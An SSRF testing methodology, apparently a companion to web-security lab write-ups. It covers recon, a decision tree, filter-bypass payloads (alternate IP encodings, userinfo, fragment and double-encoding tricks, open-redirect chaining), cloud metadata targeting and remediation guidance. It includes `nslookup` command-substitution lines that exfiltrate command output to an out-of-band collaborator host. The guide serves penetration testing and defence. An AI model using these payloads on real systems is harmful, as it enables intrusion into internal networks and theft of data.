# Methodology — Server-Side Request Forgery (SSRF) Testing

A practical, repeatable testing methodology for identifying, confirming, and exploiting SSRF (CWE-918) during web application penetration testing or bug bounty work. This complements the individual lab writeups in this folder — use it as the field checklist, use the lab writeups as worked examples.

---

## 1. Recon — Identifying Candidate Attack Surface

Look for any functionality where the application itself fetches a resource on behalf of the user, or forwards client-controlled data into an outbound request:

| Functionality type | Typical indicators |
|---|---|
| Fetching remote data to display | "Check stock", "preview link", "import from URL", webhook configuration |
| File/document processing that references external resources | PDF generation, XML parsing (XXE-driven SSRF), image fetching by URL |
| Server-side analytics / link tracking | Features that log or visit the `Referer` header, "backlink checkers" |
| Partial URLs in parameters | A parameter that is only a hostname, path, or ID that gets built into a full URL server-side |
| Any parameter whose value looks like a URL, hostname, or IP | `url=`, `stockApi=`, `callback=`, `feed=`, `path=`, `redirect=` |

A parameter is a stronger candidate if the application's own normal traffic shows it submitting full or partial URLs, or if changing its value visibly affects what external data is displayed back.

---

## 2. Decision Tree

```
                [Candidate parameter/header identified]
                               │
                 ┌─────────────┴─────────────┐
                 ▼                             ▼
     [Does changing it affect the        [Is a filter present?
      visible response at all?]           (error messages on
                 │                         certain inputs)]
                 ▼                             │
     ┌───────────┴───────────┐                 ▼
     ▼                       ▼          [Identify filter type]
[Response reflects      [No visible      ┌─────┴─────┐
 fetched content]         change]        ▼           ▼
     │                       │      [Blacklist]  [Whitelist]
     ▼                       ▼           │           │
 VERBOSE SSRF          Try OAST probe     ▼           ▼
 → target localhost    (Collaborator   Alternate    Parser
   → target internal    in the field    encodings   differential
     IP range            or header)    (IP/keyword)  (@, #, double-
                               │                       encoding)
                               ▼                           │
                     [Interaction received?]               ▼
                          │        │              Chain with open
                         Yes       No              redirect if
                          │        │               same-origin-only
                          ▼        ▼
                    BLIND SSRF   Not vulnerable
                    confirmed    via this input
                          │
                          ▼
              Escalate: internal scanning,
              chain into RCE on reachable
              internal services (e.g. Shellshock)
```

---

## 3. Confirming the Vulnerability by Response Type

### 3a. Regular (in-band) SSRF
- Payload: redirect the URL-accepting parameter to `http://localhost/<sensitive-path>` or a known/guessed internal IP.
- Confirmation: the fetched content (admin panel HTML, internal service banner, etc.) is reflected directly in the application's response.
- Escalation: enumerate the internal network by brute-forcing IP octets/ports with Burp Intruder, sorting by response status/length/time to find live internal hosts.
- See: `Lab-01-Basic-SSRF-Local-Server.md`, `Lab-02-Basic-SSRF-Backend-System.md`.

### 3b. Blind SSRF — out-of-band detection
- Use when no fetched content is reflected anywhere in the response.
- Inject a unique OAST (e.g. Burp Collaborator) domain into the candidate parameter or header (`Referer`, `X-Forwarded-Host`, etc.).
- Confirmation: a DNS and/or HTTP interaction is logged against the unique domain. A DNS-only interaction (no follow-up HTTP) still confirms the primitive — it usually means outbound HTTP is firewalled but DNS egress is permitted.
- See: `Lab-05-Blind-SSRF-OOB-Detection.md`.

### 3c. Blind SSRF — chained exploitation
- Once a blind SSRF reaches a reachable internal host, consider what else might be exploitable there: known CVEs (e.g. Shellshock), default credentials, unauthenticated admin panels.
- Combine internal IP-range brute-forcing with a header/body payload that triggers code execution and exfiltrates data via DNS (inline command substitution): `` nslookup `whoami`.<collaborator-domain> `` or `nslookup $(whoami).<collaborator-domain>`.
- See: `Lab-07-Blind-SSRF-Shellshock.md`.

---

## 4. Filter Bypass Cheat-Sheet

### 4a. Blacklist filters (block specific strings)

| Blocked string | Bypass technique | Example |
|---|---|---|
| `127.0.0.1` / `localhost` | Alternate IP notations | `127.1`, `2130706433` (decimal), `017700000001` (octal), `0x7f000001` (hex), `[::1]`, `[::ffff:127.0.0.1]` |
| A keyword in the path (e.g. `admin`) | Double URL-encoding of one character | `admin` → encode `a` as `%61` → encode again as `%2561` |
| The hostname itself | Attacker-registered domain that resolves to `127.0.0.1` | A custom DNS record (or `spoofed.burpcollaborator.net`-style services) |
| Any literal substring | Case variation / mixed encoding | `LocalHost`, partial `%`-encoding of individual characters |

### 4b. Whitelist filters (only allow an expected host/domain)

| Technique | How it works | Example |
|---|---|---|
| Embedded credentials | Everything before `@` is userinfo; some validators only check that the expected hostname string appears *somewhere* in the URL | `https://expected-host:fakepassword@evil-host/` |
| URL fragment | `#` starts a fragment that a full parser discards, but a loose validator may still "see" the expected host after it | `https://evil-host#expected-host` |
| DNS hierarchy | The expected string becomes a subdomain label the attacker controls | `https://expected-host.evil-host/` |
| Parser differential via (double) encoding | Validator and requester decode the string a different number of times, ending up with different effective hosts | `http://localhost%2523@expected-host/` → requester decodes `%2523`→`%23`→`#`, treats `@expected-host/...` as a fragment, connects to `localhost` |

### 4c. Open-redirect chaining

When the SSRF-accepting parameter is restricted to same-origin/local paths only, look for a separate open-redirect endpoint on the same origin (e.g. a "next product", "continue", or tracking-redirect feature). If the HTTP client performing the SSRF-driven request follows redirects automatically, feed it the redirect endpoint with the real (internal/external) target in the redirect's own parameter:
```
stockApi=/open-redirect-endpoint?path=http://192.168.0.X:PORT/target
```
See: `Lab-04-Open-Redirect-Filter-Bypass.md`, `Lab-06-Whitelist-Filter-Bypass.md`.

---

## 5. Out-of-Band (OAST) Toolkit

| Technique | Use case |
|---|---|
| Inject a Collaborator domain directly into the candidate URL parameter | Confirm blind SSRF where no response/content is reflected |
| Inject into less-obvious vectors: `Referer`, `User-Agent`, `X-Forwarded-For`, `X-Forwarded-Host` | Discover SSRF driven by auxiliary functionality (analytics, logging, WAF/proxy headers) that isn't part of the main request/response flow |
| Combine with IP-range brute-forcing (Burp Intruder, numeric payload on the final octet) | Map which internal hosts are reachable from the vulnerable server |
| Inline command substitution in an injected payload (`` `cmd` ``/`$(cmd)`) pointed at a Collaborator domain | Exfiltrate command output from a chained RCE on an internal host, one DNS query at a time |
| Note DNS-only vs DNS+HTTP interactions | DNS-only often means egress HTTP/HTTPS is firewalled while DNS is permitted — still a valid confirmation |

---

## 6. Testing Checklist

- [ ] Enumerate all parameters/headers that resemble or control a URL, hostname, path, or IP.
- [ ] For each candidate, test an unmodified/benign value first to establish baseline behaviour.
- [ ] Try `http://localhost/` and `http://127.0.0.1/` variants — check for reflected content or distinct error messages (filter presence).
- [ ] If blocked, identify whether the defense looks like a blacklist (specific strings rejected) or a whitelist (only specific strings accepted), and apply the matching bypass techniques above.
- [ ] If same-origin/local-path-only restrictions are enforced, search the rest of the application for an open redirect on the same origin to chain through.
- [ ] If no content is ever reflected, set up an OAST listener and test the candidate parameter and relevant headers (`Referer`, `User-Agent`, `X-Forwarded-*`).
- [ ] On a confirmed SSRF (in-band or blind), attempt internal network/port enumeration with Burp Intruder across likely private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and common internal ports (80, 443, 8080, 8443, 3000, 9200, etc.).
- [ ] For reachable internal hosts, consider chaining into known vulnerabilities (outdated CGI/Bash, default admin creds, cloud metadata endpoints such as `169.254.169.254`) rather than stopping at "SSRF confirmed."
- [ ] Document exact payloads, request/response pairs (or Collaborator interaction logs) as evidence.
- [ ] Map the finding to CWE-918 / OWASP A10 — Server-Side Request Forgery, and write remediation guidance (see individual lab writeups, Section 7).

---

## 7. Remediation Summary (for reporting)

1. **Avoid attacker-controlled destination URLs for server-side fetches wherever possible.** Prefer a closed, server-side-defined set of allowed resources (IDs mapped to trusted endpoints) over accepting arbitrary URLs.
2. **Validate with a strict allowlist against the fully-parsed, canonical hostname/IP — never a blacklist, and never the raw string.**
3. **Use one single, specification-compliant URL parser for both validation and the actual request**, to eliminate parser-differential bypasses (userinfo, fragments, double-encoding).
4. **Disable automatic redirect-following** in the HTTP client making server-side requests, or re-validate every redirect's destination against the same allowlist.
5. **Apply network segmentation and egress filtering** so the application server can only reach the specific hosts/ports it legitimately needs — this limits the blast radius even when an SSRF exists.
6. **Never treat "request originated from localhost/internal network" as sufficient authorization** for sensitive functionality; require real authentication regardless of source.
7. **Patch internal infrastructure promptly** — blind SSRF severity is ultimately bounded by what vulnerabilities exist on systems the application server can reach.

---

## 8. References

- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PortSwigger — Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [PortSwigger — SSRF / URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP Top 10](https://owasp.org/Top10/)
